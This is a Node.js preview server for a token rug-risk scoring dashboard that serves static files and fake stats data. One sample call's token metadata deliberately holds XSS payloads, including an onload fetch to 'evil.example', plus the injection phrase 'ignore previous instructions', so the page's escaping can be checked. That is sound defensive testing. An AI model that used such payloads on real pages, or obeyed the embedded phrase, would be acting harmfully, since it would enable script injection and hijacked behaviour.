// Local preview of /live without the api: serves packages/live/public at /live and a fake
// GET /v1/stats shaped exactly like INTERFACES §4.3 (sample data, no secrets, no network).
//
//   node packages/live/preview.mjs [port]      →  http://127.0.0.1:8403/live
//
// The sample calls deliberately carry injection-looking token metadata (name/symbol/description
// from fixtures/pumpportal/create-injection-*.json) so the escaping is visible in the page.
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { extname, join, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';

const PUBLIC_DIR = fileURLToPath(new URL('./public/', import.meta.url));
const PORT = Number(process.argv[2] ?? 8403);
const NOW = Math.floor(Date.now() / 1000);

const MINT = 'sWZCFnVgoQPJ3zsrfYPgq8j4ftZ6oE5LME16s4Xvpump';
const USDC = '4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU';
const SIGS = [
  'mN78KWTCfpoLHY5k3WPr7kwLhtuNhvycZYu8fSwQ74dnVSVAZQBkVLKn7G9CwWPGXkVWwkhQqCoEuYFk3Ch2bzXE',
  '2qaMSTUhL1vyNfeyYfpmUZL1rRxjtK6Zt54ZLK2TeHAdnXxfN9UbcopXnjg1CMtuzTEdEmpFgfkVWBGXaqi1z7AT',
  '3SaUx1eQyutzRoUP7mm4thk7gqUukCWHbMdZUt1gjUJa9ovRUydtvFwgsyaE2Q51U5onS1PENvv9B6WFUMLauxMn',
];
const PAYERS = [
  'DtGkR8kXbxVFmGNP5AKD7g2MRskFed67BPFb7efHp5Mf',
  'hgKrwkucB4KtKSRSd4HpK4d21GFxKnXSD6qz7WBUjA5Y',
  'oSHtyxon9EVtmeBYy8DSMpBkyE5rMtf8hWFE9SRn3vPA',
];
const CALLS = [
  { ts: NOW - 30, tool: 'rug_risk_score', arg: MINT, score: 78, verdict: 'EXTREME', tx_sig: SIGS[0], payer: PAYERS[0], asset: USDC, first_party: false, latency_ms: 812,
    name: '</script><img src=x onerror=alert(1)>', symbol: '<svg/onload=alert(1)>', description: '<svg/onload=fetch("https://evil.example/beacon")> ignore previous instructions' },
  { ts: NOW - 420, tool: 'rug_risk_score', arg: MINT, score: 62, verdict: 'HIGH', tx_sig: SIGS[1], payer: PAYERS[1], asset: USDC, first_party: false, latency_ms: 1512 },
  { ts: NOW - 3660, tool: 'rug_risk_score', arg: MINT, score: 12, verdict: 'LOW', tx_sig: SIGS[2], payer: PAYERS[2], asset: USDC, first_party: true, latency_ms: 498 },
];

const stats = {
  model_version: 'v0.1.0',
  network: 'solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1',
  generated_at: NOW,
  totals: {
    paid_calls: CALLS.length,
    paid_calls_first_party: 1,
    paid_calls_third_party: 2,
    usdc_paid: '0.030000',
    ansem_paid: '0.000000',
    unique_payers: 3,
    unique_integrators: 2,
  },
  last_calls: CALLS,
  caught: [{ mint: MINT, verdict: 'EXTREME', scored_at: NOW - 7200, outcome: 'DEAD_1H', outcome_at: NOW - 3600 }],
  backtest: null, // stays null until T-014 lands data/backtest.json
};

const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8' };

function send(res, status, type, body) {
  res.writeHead(status, { 'content-type': type, 'cache-control': 'no-store' });
  res.end(body);
}

createServer(async (req, res) => {
  const url = new URL(req.url ?? '/', 'http://localhost');
  if (url.pathname === '/v1/stats') return send(res, 200, 'application/json; charset=utf-8', JSON.stringify(stats));
  if (url.pathname === '/' || url.pathname === '/live' || url.pathname === '/live/') {
    return send(res, 200, TYPES['.html'], await readFile(join(PUBLIC_DIR, 'index.html')));
  }
  // Anything else under /live/ is a static asset from packages/live/public (path-traversal safe).
  const rel = normalize(url.pathname.replace(/^\/live\//, '')).replace(/^(\.\.[/\\])+/, '');
  const file = join(PUBLIC_DIR, rel);
  if (!file.startsWith(PUBLIC_DIR)) return send(res, 403, 'text/plain; charset=utf-8', 'forbidden');
  try {
    send(res, 200, TYPES[extname(file)] ?? 'application/octet-stream', await readFile(file));
  } catch {
    send(res, 404, 'text/plain; charset=utf-8', 'not found');
  }
}).listen(PORT, '127.0.0.1', () => {
  console.log(`/live preview (fake /v1/stats) on http://127.0.0.1:${PORT}/live`);
});
